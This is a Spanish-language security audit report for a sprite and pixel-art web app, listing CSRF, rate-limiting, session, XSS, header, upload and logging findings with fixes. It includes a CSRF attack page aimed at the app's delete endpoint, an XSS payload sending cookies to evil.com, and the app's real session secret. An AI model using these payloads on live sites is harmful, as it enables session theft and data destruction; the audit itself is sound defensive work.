# 04 - Seguridad

**Fecha de auditoría:** 2026-04-07
**Severidad general:** ALTA — múltiples vulnerabilidades críticas
**Hallazgos:** 4 CRÍTICOS, 6 ALTOS, 5 MEDIOS

---

## Resumen de Severidad

| Severidad | Cantidad | Descripción |
|-----------|----------|-------------|
| CRÍTICO | 4 | Explotable remotamente, impacto alto |
| ALTO | 6 | Riesgo significativo, requiere acción inmediata |
| MEDIO | 5 | Riesgo moderado, planificar corrección |

---

## Hallazgos CRÍTICOS

### C1: Sin protección CSRF

**Ubicación:** Todas las rutas POST (authRoutes.js, apiRoutes.js, pixelArtRoutes.js)
**Descripción:** No hay tokens CSRF en ningún formulario ni endpoint. Un atacante puede crear una página que envíe requests en nombre de un usuario autenticado.
**Impacto:** Un atacante podría eliminar todos los proyectos de un usuario, cambiar datos, o crear contenido malicioso haciéndose pasar por el usuario.
**Vector de ataque:**
```html
<!-- Página maliciosa -->
<form action="https://sprites.decatron.net/api/delete-project/1" method="POST">
  <input type="hidden" name="_method" value="DELETE">
</form>
<script>document.forms[0].submit()</script>
```
**Resolución:** Implementar csrf-csrf o csurf middleware. Agregar token CSRF a todos los formularios y validar en cada request POST/PUT/DELETE.

### C2: Sin rate limiting

**Ubicación:** Todos los endpoints, especialmente `/auth/login` y `/auth/register`
**Descripción:** No hay límite de requests por IP ni por usuario. Permite ataques de fuerza bruta en login, spam de registros, y abuso de API.
**Impacto:** Un atacante puede intentar miles de contraseñas por minuto, crear miles de cuentas, o saturar el servidor con uploads masivos.
**Resolución:** Implementar express-rate-limit con configuraciones diferenciadas:

| Endpoint | Rate limit recomendado |
|----------|----------------------|
| POST /auth/login | 5 intentos / 15 min por IP |
| POST /auth/register | 3 registros / hora por IP |
| POST /api/save-project | 30 / hora por usuario |
| POST /api/pixelart/save-project | 30 / hora por usuario |
| GET general | 100 / min por IP |

### C3: Sesiones inseguras

**Ubicación:** server.js línea 34-39, almacenamiento en memoria
**Descripción:** Múltiples problemas con la configuración de sesiones:

| Problema | Valor actual | Valor correcto |
|----------|-------------|----------------|
| cookie.secure | false | true (HTTPS) |
| cookie.httpOnly | (default true) | true (explícito) |
| cookie.sameSite | (no definido) | 'strict' o 'lax' |
| Session store | MemoryStore (default) | connect-pg-simple |
| Session secret | Texto plano débil | Variable de entorno robusta |

**Impacto:**
- `secure: false` — cookies enviadas sobre HTTP, interceptables en MITM
- MemoryStore — sesiones se pierden al reiniciar, memory leak en producción (Express lo advierte explícitamente)
- Sin `sameSite` — vulnerable a CSRF

**Resolución:**
```javascript
app.use(session({
    store: new PgSession({ pool }),
    secret: process.env.SESSION_SECRET, // cambiar a UUID largo
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: true,
        httpOnly: true,
        sameSite: 'lax',
        maxAge: 24 * 60 * 60 * 1000 // 24h
    }
}));
```

### C4: XSS en renderizado dinámico de listas

**Ubicación:** uiManager.js (renderAnimationsList, renderProjectsList)
**Descripción:** Se usa innerHTML para renderizar datos del usuario sin sanitización. Si un nombre de animación o proyecto contiene HTML, se ejecuta en el navegador.
**Vector de ataque:**
```
Nombre de animación: <img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
```
**Impacto:** Robo de sesión, ejecución de código arbitrario en el navegador de la víctima.
**Nota:** pixelArtProject.js tiene función `escapeHtml()` pero no se usa consistentemente en todos los puntos de renderizado.
**Resolución:** Usar escapeHtml() en todos los puntos donde se insertan datos del usuario en el DOM. Preferir textContent sobre innerHTML cuando sea posible.

---

## Hallazgos ALTOS

### A1: Sin headers de seguridad HTTP

**Ubicación:** server.js — sin helmet middleware
**Headers faltantes:**

| Header | Propósito | Valor recomendado |
|--------|----------|-------------------|
| X-Content-Type-Options | Prevenir MIME sniffing | nosniff |
| X-Frame-Options | Prevenir clickjacking | DENY |
| X-XSS-Protection | XSS filter del navegador | 1; mode=block |
| Strict-Transport-Security | Forzar HTTPS | max-age=31536000; includeSubDomains |
| Content-Security-Policy | Controlar orígenes de contenido | default-src 'self' |
| Referrer-Policy | Controlar referrer | strict-origin-when-cross-origin |

**Resolución:** Instalar y configurar helmet.

### A2: Información de error expuesta

**Ubicación:** authRoutes.js líneas 67, 77
**Descripción:** Los mensajes de error en login distinguen entre "email no registrado" y "contraseña incorrecta". Esto permite a un atacante enumerar usuarios válidos.
**Resolución:** Usar mensaje genérico: "Credenciales incorrectas" para ambos casos.

### A3: Sin validación de session fixation

**Ubicación:** authRoutes.js línea 72
**Descripción:** Después de un login exitoso, no se regenera el ID de sesión. Un atacante que conozca el session ID antes del login puede secuestrar la sesión después.
**Resolución:**
```javascript
req.session.regenerate((err) => {
    req.session.user = { id, username, email };
    res.redirect('/editor');
});
```

### A4: Validación de password débil

**Ubicación:** authRoutes.js línea 33
**Descripción:** Solo requiere 6 caracteres mínimo. Sin requisitos de complejidad.
**Resolución:** Mínimo 8 caracteres, al menos una mayúscula, una minúscula y un número. Considerar integrar zxcvbn para análisis de fortaleza.

### A5: Sin account lockout

**Ubicación:** authRoutes.js
**Descripción:** No hay mecanismo para bloquear cuentas después de intentos fallidos de login. Combinado con la falta de rate limiting (C2), permite fuerza bruta ilimitada.
**Resolución:** Implementar contador de intentos fallidos por email. Bloquear temporalmente después de 5 intentos (15 minutos).

### A6: Upload de archivos sin sanitización completa

**Ubicación:** apiRoutes.js líneas 20-49
**Descripción:** Multer valida MIME type pero no:
- Contenido real del archivo (magic bytes)
- Nombre de archivo para path traversal
- Dimensiones de imagen
- Extensión doble (file.png.exe)
**Resolución:** Validar magic bytes, sanitizar filename con UUID, validar extensión contra whitelist, limitar dimensiones.

---

## Hallazgos MEDIOS

### M1: Session secret débil

**Ubicación:** .env
**Valor actual:** `un_secreto_muy_dificil_de_adivinar`
**Resolución:** Generar con `openssl rand -hex 32` y almacenar como variable de entorno.

### M2: Sin CORS configurado

**Ubicación:** server.js
**Descripción:** No hay configuración CORS. Si la API es consumida desde otro dominio, fallará. Si no se necesita CORS, debería bloquearse explícitamente.
**Resolución:** Instalar cors middleware y configurar whitelist de orígenes.

### M3: Archivos subidos accesibles públicamente

**Ubicación:** public/uploads/
**Descripción:** Todas las imágenes subidas son accesibles sin autenticación via URL directa. Cualquiera puede acceder a `/uploads/username/archivo.png`.
**Resolución:** Mover uploads fuera de public, servir via ruta autenticada, o aceptar que las imágenes son públicas (documentar decisión).

### M4: Sin logging estructurado

**Ubicación:** Todo el proyecto
**Descripción:** Solo se usa `console.log` y `console.error`. Sin timestamps, niveles, ni formato estructurado. Sin rotación de logs.
**Resolución:** Implementar winston o pino con formato JSON y rotación.

### M5: JSZip cargado desde CDN sin integridad

**Ubicación:** pixelArtExport.js (carga dinámica)
**Descripción:** JSZip se carga dinámicamente desde CDN sin atributo `integrity` (SRI). Si el CDN es comprometido, se ejecuta código malicioso.
**Resolución:** Instalar JSZip como dependencia local o agregar hash SRI al script tag.

---

## Matriz de Resolución

| ID | Severidad | Esfuerzo | Dependencia | Prioridad |
|----|-----------|----------|-------------|-----------|
| C1 | CRÍTICO | Medio | Ninguna | 1 |
| C2 | CRÍTICO | Bajo | Ninguna | 1 |
| C3 | CRÍTICO | Medio | connect-pg-simple | 2 |
| C4 | CRÍTICO | Bajo | Ninguna | 1 |
| A1 | ALTO | Bajo | helmet | 2 |
| A2 | ALTO | Bajo | Ninguna | 2 |
| A3 | ALTO | Bajo | Ninguna | 2 |
| A4 | ALTO | Bajo | Ninguna | 3 |
| A5 | ALTO | Medio | Rate limiting (C2) | 3 |
| A6 | ALTO | Medio | Ninguna | 3 |
| M1 | MEDIO | Bajo | Ninguna | 2 |
| M2 | MEDIO | Bajo | cors | 3 |
| M3 | MEDIO | Medio | Decisión de diseño | 4 |
| M4 | MEDIO | Medio | winston/pino | 4 |
| M5 | MEDIO | Bajo | Ninguna | 3 |
